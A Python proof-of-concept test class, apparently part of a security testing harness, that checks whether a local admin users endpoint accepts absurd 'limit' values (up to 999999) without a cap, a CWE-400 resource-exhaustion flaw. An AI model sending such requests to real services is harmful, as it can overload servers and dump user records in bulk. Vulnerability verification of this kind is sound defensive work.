"""PoC exploit: Resource exhaustion via unbounded user listing (CWE-400)."""

from mosaic.oracle.exploit import ExploitTest


class HasuraResourceExhaustionExploit(ExploitTest):
    """Resource exhaustion: unbounded limit on admin users endpoint."""

    def __init__(self, base_url: str = "http://localhost:4000"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "hasura_resource_exhaustion"

    def execute(self) -> tuple[bool, str]:
        """Test that limit > 100 is accepted without capping."""
        # Baseline
        normal = self.http_get("/admin/users")
        if not normal.ok:
            return False, f"Baseline /admin/users failed: {normal.status_code}"

        # Test above old cap
        big = self.http_get("/admin/users", params={"limit": "200"})
        if not big.ok:
            return False, f"/admin/users?limit=200 failed: {big.status_code}"

        # Absurd limit
        huge = self.http_get("/admin/users", params={"limit": "999999"})
        if not huge.ok:
            return False, f"/admin/users?limit=999999 failed: {huge.status_code}"

        try:
            data = huge.json()
            reported_limit = data.get("limit")
            users = data.get("users", [])
            if reported_limit is not None and int(reported_limit) > 100:
                return True, (
                    f"Resource exhaustion confirmed (CWE-400). Server accepted "
                    f"limit={reported_limit} (no cap). Returned {len(users)} users "
                    f"with nested sessions/roles."
                )
            if isinstance(users, list) and len(users) > 100:
                return True, (
                    f"Resource exhaustion confirmed (CWE-400). "
                    f"limit=999999 returned {len(users)} users. No cap enforced."
                )
        except Exception:
            pass

        try:
            big_data = big.json()
            big_limit = big_data.get("limit")
            if big_limit is not None and int(big_limit) > 100:
                return True, (
                    f"Resource exhaustion confirmed (CWE-400). "
                    f"limit=200 accepted as {big_limit}."
                )
        except Exception:
            pass

        return False, "Limit cap appears to still be enforced."
